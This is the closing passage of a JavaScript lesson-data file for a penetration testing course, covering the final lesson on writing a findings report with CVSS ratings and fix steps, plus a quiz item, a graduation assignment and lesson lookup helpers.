        steps: ["Organize all your attack notes and screenshots systematically.", "Rate your findings using the industry-standard CVSS score scale, and write plain-English fixes for each issue."],
        cmd: [{ t: "c", v: "Required Sections Checklist" }, { t: "out", v: "1. Executive Summary\n2. Vulnerability Map\n3. CVSS Severity Ratings\n4. Fix Instructions" }]
      }
    ],
    hints: ["Keep your executive summaries focused on business impact and risk, avoiding overly dense technical jargon so managers can easily understand."],
    quiz: [{ q: "What is the ultimate goal of a red team training or penetration testing report?", opts: ["To show off personal skills", "To clearly explain identified risks and provide actionable fix steps to secure the network", "To get a system shut down", "To look for software bugs"], a: 1 }],
    assignment: {
      title: "FINAL GRADUATION EXERCISE",
      tasks: [
        "Complete all 4 operational phases.",
        "Write a complete report covering all 4 core report modules.",
        "Document at least 5 verified laboratory findings with CVSS scores.",
        "Include step-by-step fix recommendations for every vulnerability found."
      ],
      submit: "Submit your final penetration testing report to complete your graduation assignment."
    }
  }
];

// Helper Query Navigation Functions
function getLessonById(id) { return LESSONS.find(l => l.id === parseInt(id)) || null; }
function getLessonsByPhase(p) { return LESSONS.filter(l => l.phase === parseInt(p)); }
function getLessonsByMonth(m) { return LESSONS.filter(l => l.month === parseInt(m)); }
